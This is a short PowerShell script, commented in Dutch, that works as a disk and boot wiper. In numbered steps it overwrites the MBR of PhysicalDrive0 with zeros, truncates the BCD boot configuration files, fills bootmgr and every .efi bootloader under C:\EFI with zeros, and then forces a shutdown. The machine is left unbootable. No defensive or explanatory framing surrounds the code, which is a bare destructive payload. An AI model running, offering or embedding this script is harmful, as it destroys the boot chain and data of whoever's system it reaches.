# 1. MBR overschrijven (\\.\PhysicalDrive0)
$drive = [IO.File]::Open("\\.\PhysicalDrive0", 'Open', 'Write', 'None')
$nulls = New-Object byte[] 512
$drive.Write($nulls, 0, 512)
$drive.Close()

# 2. BCD overschrijven
@("C:\Boot\BCD", "C:\EFI\Microsoft\Boot\BCD") | ForEach-Object {
    if (Test-Path $_) {
        $stream = [IO.File]::Open($_, 'Open', 'Write', 'None')
        $stream.SetLength(0)
        $stream.Close()
    }
}

# 3. bootmgr
if (Test-Path "C:\bootmgr") {
    Set-Content -Path "C:\bootmgr" -Value ([byte[]]@(0x00)*1MB) -Encoding Byte
}

# 4. EFI Bootloader (alle .efi in EFI partitie)
Get-ChildItem "C:\EFI" -Recurse -Include "*.efi" | ForEach-Object {
    Set-Content -Path $_.FullName -Value ([byte[]]@(0x00)*1MB) -Encoding Byte
}

# 5. Force shutdown
Stop-Computer -Force